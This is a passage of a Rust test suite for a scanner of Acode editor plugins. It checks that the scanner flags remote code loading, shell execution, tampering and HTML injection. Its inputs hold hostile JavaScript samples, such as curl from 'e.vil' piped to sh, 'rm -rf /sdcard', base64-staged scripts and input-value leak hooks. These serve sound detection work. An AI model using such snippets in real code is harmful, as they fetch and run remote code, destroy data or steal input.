            "network.acode_account_read"
        ));
        // Public registry reads are what plugin managers do.
        assert!(
            !ids("fetch('https://acode.app/api/plugins?page=1')")
                .iter()
                .any(|id| id.starts_with("network.acode_account"))
        );
        // Options built elsewhere could hold any method.
        assert_eq!(
            severity_of(
                "fetch('https://acode.app/api/plugin', opts)",
                "network.acode_account_write"
            ),
            Some(Severity::Medium)
        );
    }

    #[test]
    fn grades_webassembly_loading() {
        assert!(has(
            "WebAssembly.instantiateStreaming(fetch('https://cdn.example.com/x.wasm'), imports)",
            "wasm.remote_module"
        ));
        assert!(has(
            "const U = 'https://e.vil/m.wasm'; WebAssembly.compileStreaming(await fetch(U))",
            "wasm.remote_module"
        ));
        // Loading the plugin's own module is normal.
        assert!(!has(
            "WebAssembly.instantiateStreaming(fetch(baseUrl + 'tree-sitter.wasm'), imports)",
            "wasm.remote_module"
        ));
        assert!(has(
            "WebAssembly.instantiate(bytes, imports)",
            "wasm.instantiate"
        ));
    }

    #[test]
    fn grades_account_bridge_calls() {
        assert_eq!(
            severity_of(
                "cordova.exec(a, b, 'Authenticator', 'saveToken', [token])",
                "native.account_bridge"
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            severity_of(
                "cordova.exec(a, b, 'Authenticator', 'logout', [])",
                "native.account_bridge"
            ),
            Some(Severity::High)
        );
        assert!(!has(
            "cordova.exec(a, b, 'Authenticator', 'logout', [])",
            "native.cordova_exec"
        ));
    }

    #[test]
    fn grades_shell_commands_by_source() {
        let shell_max = |source: &str| {
            findings(source)
                .into_iter()
                .filter(|(id, _)| id.starts_with("shell."))
                .map(|(_, severity)| severity)
                .max()
        };
        assert_eq!(
            shell_max("Executor.execute('apk add git')"),
            Some(Severity::Medium)
        );
        assert_eq!(
            shell_max("Executor.execute('uname -m')"),
            Some(Severity::Low)
        );
        assert_eq!(shell_max("Executor.execute(cmd)"), Some(Severity::High));
        assert_eq!(
            shell_max(
                "async function f(){ const r = await fetch(u); Executor.execute(await r.text()) }"
            ),
            Some(Severity::Critical)
        );
        assert!(has(
            "fetch(u).then(r => r.json()).then(d => Executor.execute(`apk add ${d.pkg}`))",
            "shell.remote_command"
        ));
        assert!(has(
            "Executor.spawnStream(['sh', '-c', x.responseText], cb)",
            "shell.remote_command"
        ));
        // A constant command inside a fetch callback is not downloaded.
        assert!(!has(
            "fetch(u).then(() => Executor.execute('apk add git'))",
            "shell.remote_command"
        ));
        assert!(has("Executor.execute(atob(cmd))", "shell.decoded_command"));
        assert!(has(
            "const t = acode.require('terminal'); t.write(id, atob(c))",
            "shell.decoded_command"
        ));
    }

    fn shell_keys(source: &str) -> Vec<(String, Severity)> {
        let mut ctx = RuleContext::new("main.js", source, None);
        analyze(&mut ctx);
        ctx.findings
            .into_iter()
            .filter(|finding| finding.id == "shell.exec")
            .map(|finding| (finding.key, finding.severity))
            .collect()
    }

    #[test]
    fn grades_each_call_of_a_command_helper() {
        let source = "(function(){ const sh = (cmd) => Executor.execute(cmd, true);
            sh('uname -m'); sh('apk add git'); })()";
        let keys = shell_keys(source);
        assert!(keys.contains(&("shell.exec:execute:inspect".into(), Severity::Low)));
        assert!(keys.contains(&("shell.exec:execute:program".into(), Severity::Medium)));
        // Every use of the helper was graded, so its body adds nothing.
        assert!(!keys.iter().any(|(_, severity)| *severity == Severity::High));

        // A helper that escapes (passed around) keeps the runtime finding.
        let escaped =
            "(function(){ const sh = (c) => Executor.execute(c); sh('ls'); window.run = sh; })()";
        assert!(shell_keys(escaped).contains(&("shell.exec:execute".into(), Severity::High)));

        // Top-level helpers are globals other scripts can call.
        let global = "function sh(c){ return Executor.execute(c) } sh('ls');";
        assert!(shell_keys(global).contains(&("shell.exec:execute".into(), Severity::High)));

        // Methods called through `this`, and helpers of helpers.
        let class = "class A { run(c) { return Executor.execute(c) }
            go(c) { return this.run(c) } x() { this.go('pwd'); this.run('mkdir -p /tmp/a') } }";
        let keys = shell_keys(class);
        assert!(
            keys.contains(&("shell.exec:execute:inspect".into(), Severity::Low)),
            "{keys:?}"
        );
        assert!(
            !keys.iter().any(|(_, severity)| *severity == Severity::High),
            "{keys:?}"
        );

        // Remote text through a helper is still remote.
        assert!(has(
            "(function(){ const sh = c => Executor.execute(c); fetch(u).then(r => r.text()).then(t => sh(t)); })()",
            "shell.remote_command"
        ));
    }

    #[test]
    fn follows_helpers_whose_sink_sits_in_a_callback() {
        // `exec(cmd)` that wraps Executor in a Promise is still a command helper.
        let source = "(function(){ function exec(cmd) {
                return new Promise((resolve, reject) => {
                    Promise.resolve(Executor.start(cmd, (t, d) => {}, true)).then(resolve, reject);
                });
            }
            exec('curl https://e.vil/x | sh'); exec('uname -m'); })()";
        assert!(has(source, "shell.dangerous_command"), "{:?}", ids(source));
        // Every call was graded, so the sink inside adds no runtime finding.
        let benign = source.replace("curl https://e.vil/x | sh", "apk add git");
        let keys = shell_keys(&benign);
        assert!(
            !keys.iter().any(|(_, severity)| *severity == Severity::High),
            "{keys:?}"
        );
    }

    #[test]
    fn decodes_base64_staged_scripts() {
        // btoa of a constant script, staged into a file and run.
        let staged = "const s = ['set -e', 'curl https://e.vil/x | sh'].join('\\n');
            Executor.start(`printf %s ${btoa(s)} | base64 -d > /tmp/s.sh && sh /tmp/s.sh`);";
        assert!(has(staged, "shell.encoded_script"), "{:?}", ids(staged));
        assert!(has(staged, "shell.dangerous_command"), "{:?}", ids(staged));

        // A local `toBase64` helper that ends in btoa folds the same way.
        let helper = "(function(){ function enc(x) { let b = ''; return btoa(b + x) }
            Executor.start(`echo ${enc('curl https://e.vil/x | sh')} | base64 -d | sh`); })()";
        assert!(has(helper, "shell.dangerous_command"), "{:?}", ids(helper));

        // A script the scanner can't read, written and then run.
        let hidden = "const SETUP = ['set -e', 'apk add git build-base',
                'git clone https://github.com/a/b /r', 'cd /r', 'make'].join('\\n');
            class P { go(script) {
                Executor.start(`printf %s ${btoa(script)} | base64 -d > /tmp/x.sh`);
                acode.require('terminal').write(1, 'sh /tmp/x.sh\\r');
            } run() { this.go(localStorage.s || SETUP) } }";
        assert!(has(hidden, "shell.staged_script"), "{:?}", ids(hidden));
        // Its script-shaped constants are checked as the likely content.
        assert!(
            has(hidden, "shell.builds_remote_source"),
            "{:?}",
            ids(hidden)
        );

        // Writing a file it never runs is not a staged script.
        assert!(!has(
            "Executor.start(`printf %s ${x} | base64 -d > /tmp/data.bin`)",
            "shell.staged_script"
        ));
    }

    #[test]
    fn follows_getters_quoting_helpers_and_builders() {
        // `getExecutor()` used to hide every call.
        let source =
            "function getExecutor(){ return typeof Executor !== 'undefined' ? Executor : null }
            const e = getExecutor(); e.execute('id -u');";
        assert!(shell_keys(source).contains(&("shell.exec:execute:inspect".into(), Severity::Low)));

        let quoted = "function q(t){ return `'${String(t).replace(/'/g, `'\\''`)}'` }
            Executor.execute(`sh -c ${q('apk add xz || true')}`);";
        assert!(
            shell_keys(quoted).contains(&("shell.exec:execute:program".into(), Severity::Medium))
        );

        let built = "class M { script(root, cmd) { return `proot -r ${root} /bin/sh -c \"${cmd.replace(/\"/g, '')}\"` }
            a(r) { return Executor.execute(this.script(r, 'uname -a')) }
            b(r, c) { return Executor.execute(this.script(r, c)) } }";
        let keys = shell_keys(built);
        assert!(
            keys.contains(&("shell.exec:execute:program".into(), Severity::Medium)),
            "{keys:?}"
        );
        assert!(
            keys.contains(&("shell.exec:execute".into(), Severity::High)),
            "{keys:?}"
        );

        let variable = "(function(){ const d = localStorage.x; const cmd = `cd \"${d}\" && ls`; Executor.execute(cmd); })()";
        assert!(
            shell_keys(variable).contains(&("shell.exec:execute:program".into(), Severity::Medium))
        );
    }

    #[test]
    fn checks_every_branch_of_a_command() {
        assert!(has(
            "Executor.execute('echo ' + (a ? 'x; curl -s https://e.vil/i | sh' : ''))",
            "shell.dangerous_command"
        ));
        assert!(has(
            "const c = a ? 'ls' : 'curl https://e.vil/i | sh'; Executor.execute(c)",
            "shell.dangerous_command"
        ));
        let keys = shell_keys("Executor.execute(a ? 'uname -m' : `sh -c ${x}`)");
        assert!(
            keys.contains(&("shell.exec:execute".into(), Severity::High)),
            "{keys:?}"
        );
    }

    #[test]
    fn grades_process_input_by_what_was_started() {
        // Input to a program the plugin started is data, not a command.
        let driver =
            "async function f(code){ const id = await Executor.start('python3 /x/driver.py', cb);
            Executor.write(id, JSON.stringify({ code }) + '\\n'); }";
        assert!(shell_keys(driver).contains(&("shell.exec:write:input".into(), Severity::Low)));
        // Writes to a shell are commands.
        let shell = "async function f(c){ const id = await Executor.start('sh', cb); Executor.write(id, `${c}\\n`); }";
        assert!(shell_keys(shell).contains(&("shell.exec:write".into(), Severity::High)));
        // Terminal tabs: unknown text is Medium (often log output); a runtime
        // command followed by Enter is High.
        let terminal =
            "const t = acode.require('terminal'); t.write(id, msg); t.write(id, `${cmd}\\n`)";
        let keys = shell_keys(terminal);
        assert!(keys.contains(&("shell.exec:terminal.write:program".into(), Severity::Medium)));
        assert!(keys.contains(&("shell.exec:terminal.write:opaque".into(), Severity::High)));
    }

    #[test]
    fn detects_remote_scripts_and_imports() {
        assert!(has(
            "const s = document.createElement('script'); s.src = 'https://cdn.evil/x.js'; document.head.append(s)",
            "dynamic.remote_script"
        ));
        assert!(!has(
            "const s = document.createElement('script'); s.src = baseUrl + 'chunk.js'",
            "dynamic.remote_script"
        ));
        assert!(has("import('https://e.vil/m.js')", "dynamic.remote_import"));
        assert!(has(
            "(function(){}).constructor('alert(1)')()",
            "dynamic.indirect_function_constructor"
        ));
        assert!(has(
            "[].constructor.constructor('alert(1)')()",
            "dynamic.indirect_function_constructor"
        ));
    }

    #[test]
    fn grades_cordova_exec_by_service() {
        assert!(has(
            "cordova.exec(a, b, 'Tee', 'requestToken', [])",
            "native.plugin_context_bridge"
        ));
        assert!(has(
            "cordova.exec(a, b, 'System', 'writeText', [])",
            "native.cordova_exec"
        ));
        assert!(has(
            "cordova.exec(a, b, svc, act, [])",
            "native.cordova_exec_dynamic"
        ));
        assert!(has(
            "const exec = cordova.require('cordova/exec'); exec(a, b, 'Tee', 'x', [])",
            "native.plugin_context_bridge"
        ));
        assert!(!has(
            "cordova.plugins.clipboard.copy('x')",
            "native.cordova_exec"
        ));
    }

    #[test]
    fn detects_tampering() {
        assert!(has(
            "acode.define('fs', evil)",
            "tampering.core_module_override"
        ));
        assert!(has(
            "acode.define('FS', evil)",
            "tampering.core_module_override"
        ));
        assert!(!has(
            "acode.define('myPluginApi', api)",
            "tampering.core_module_override"
        ));
        assert!(has("acode.require = function(){}", "tampering.acode_api"));
        assert!(has(
            "Object.defineProperty(window.acode, 'require', {})",
            "tampering.acode_api"
        ));
        assert!(has("window.fetch = hooked", "tampering.network_hook"));
        assert!(has(
            "XMLHttpRequest.prototype.send = hooked",
            "tampering.network_hook"
        ));
        assert!(has(
            "acode.setPluginInit('other.plugin', init)",
            "tampering.other_plugin"
        ));
        assert!(!has(
            "acode.setPluginInit('com.example.test', init)",
            "tampering.other_plugin"
        ));
        assert!(has(
            "fsOperation(Url.join(PLUGIN_DIR, 'victim', 'main.js')).writeFile(code)",
            "tampering.plugin_files"
        ));
        assert!(has(
            "const f = acode.fsOperation(DATA_STORAGE + 'plugins/victim/main.js'); f.writeFile(code)",
            "tampering.plugin_files"
        ));
        assert!(!has(
            "fsOperation(PLUGIN_DIR + '/x').readFile()",
            "tampering.plugin_files"
        ));
        assert!(!has(
            "fsOperation(Url.join(PLUGIN_DIR, 'com.example.test', 'bin')).createDirectory('lsp')",
            "tampering.plugin_files"
        ));
    }

    #[test]
    fn detects_hooks_on_shared_globals() {
        assert!(has(
            "const real = Executor.execute; Executor.execute = (c, ...a) => { log(c); return real(c, ...a) }",
            "tampering.native_api"
        ));
        assert!(has("window.system = proxy", "tampering.native_api"));
        assert!(has(
            "EventTarget.prototype.addEventListener = wrapped",
            "tampering.dom_hook"
        ));
        assert!(has(
            "Object.defineProperty(HTMLInputElement.prototype, 'value', { set(v) { leak(v) } })",
            "tampering.dom_hook"
        ));
        assert!(has(
            "document.head.appendChild = function (el) { return el }",
            "tampering.dom_hook"
        ));
        assert!(has(
            "window.adRewardedUnitId = 'ca-app-pub-x/y'",
            "tampering.ads"
        ));
        assert!(has(
            "const s = acode.require('settings'); s.value.pluginsDisabled['other.plugin'] = true",
            "tampering.plugin_settings"
        ));
        // Polyfills for harmless members and the plugin's own objects are fine.
        assert!(
            !ids("if (!Element.prototype.matches) Element.prototype.matches = m")
                .iter()
                .any(|id| id.starts_with("tampering."))
        );
        // core-js `make-built-in`, present in most bundles.
        assert!(!has(
            "Function.prototype.toString = y(function(){ return s(this) }, 'toString')",
            "tampering.dom_hook"
        ));
        assert!(
            !ids("const sys = {}; sys.execute = f; this.system = 1")
                .iter()
                .any(|id| id.starts_with("tampering."))
        );
    }

    #[test]
    fn detects_html_and_attribute_sinks() {
        assert!(has(
            "const s = document.createElement('script'); s.setAttribute('src', 'https://e.vil/x.js'); document.head.append(s)",
            "dynamic.remote_script"
        ));
        assert!(has(
            "fetch(u).then(r => r.text()).then(h => { document.createRange().createContextualFragment(h) })",
            "dynamic.remote_code"
        ));
        assert!(has(
            "fetch(u).then(r => r.text()).then(h => { frame.srcdoc = h })",
            "dynamic.remote_code"
        ));
        assert!(has(
            "fetch(u).then(r => r.text()).then(h => { el.innerHTML = h })",
            "dynamic.remote_html"
        ));
        assert!(has(
            "el.insertAdjacentHTML('beforeend', atob(p))",
            "dynamic.decoded_html"
        ));
        assert!(has(
            "el.setAttribute('onclick', atob(p))",
            "dynamic.decoded_exec"
        ));
        assert!(has(
            "el.innerHTML = '<img src=x onerror=\"go()\">'",
            "dynamic.inline_handler"
        ));
        // Plain markup and attributes are fine.
        assert!(
            !ids("el.innerHTML = '<b>' + name + '</b>'; el.setAttribute('class', c)")
                .iter()
                .any(|id| id.starts_with("dynamic."))
        );
        // A script element's own text is the existing inline-script rule.
        assert!(!has(
            "const s = document.createElement('script'); s.innerHTML = code",
            "dynamic.remote_html"
        ));
    }

    #[test]
    fn classifies_webview_and_plugin_settings() {
        let webview = "const webview = acode.require('webview');
            async function open() {
              const view = await webview.create({ mode: 'fullscreen' });
              await view.loadURL('https://login.example.net/');
              await view.evaluate('document.title');
            }";
        assert!(has(webview, "acode.webview"));
        assert!(has(webview, "acode.webview_remote_page"));
        assert!(has(webview, "acode.webview_script"));
        // Same method names without the webview module are someone else's.
        assert!(!has(
            "page.loadURL('https://x.io')",
            "acode.webview_remote_page"
        ));

        assert!(has(
            "const settings = acode.require('settings'); settings.update({ pluginsDisabled: { 'other.plugin': true } })",
            "tampering.plugin_settings"
        ));
        assert!(!has(
            "acode.require('settings').update({ fontSize: '14px' })",
            "tampering.plugin_settings"
        ));
    }

    #[test]
    fn checks_shell_commands() {
        assert!(has(
            "Executor.execute('curl -s https://x.io/a.sh | sh')",
            "shell.dangerous_command"
        ));
        assert!(has(
            "Executor.execute(`curl ${host}/payload | bash`)",
            "shell.dangerous_command"
        ));
        assert!(has(
            "Executor.spawnStream(['sh','-c','rm -rf /sdcard'], cb)",
            "shell.dangerous_command"
        ));
        assert!(!has(
            "Executor.execute('apk add nodejs')",
            "shell.dangerous_command"
        ));
        assert!(has(
            "Executor.loadLibrary('/data/x.so')",
            "shell.load_library"
        ));
    }

    #[test]
    fn records_urls_and_flags_webhooks_in_strings() {
        let mut ctx = RuleContext::new(
            "main.js",
            "const u = `https://discord.com/api/webhooks/${id}`; fetch(u)",
            None,
        );
        analyze(&mut ctx);
        assert!(
            ctx.facts
                .urls
                .iter()
                .any(|url| url.contains("discord.com/api/webhooks"))
        );
    }

    #[test]
    fn extracts_inline_html_scripts() {
        let html = "<html>\n<script src=\"https://cdn.x/y.js\"></script>\n<script>eval(atob(p))</script></html>";
        let (js, remote) = html_scripts(html);
        assert_eq!(js.len(), html.len());
        assert_eq!(remote, vec!["https://cdn.x/y.js".to_string()]);
        let mut ctx = RuleContext::new("index.html", &js, None);
        analyze(&mut ctx);
        assert!(
            ctx.findings
                .iter()
                .any(|finding| finding.id == "dynamic.decoded_exec")
        );
    }
}
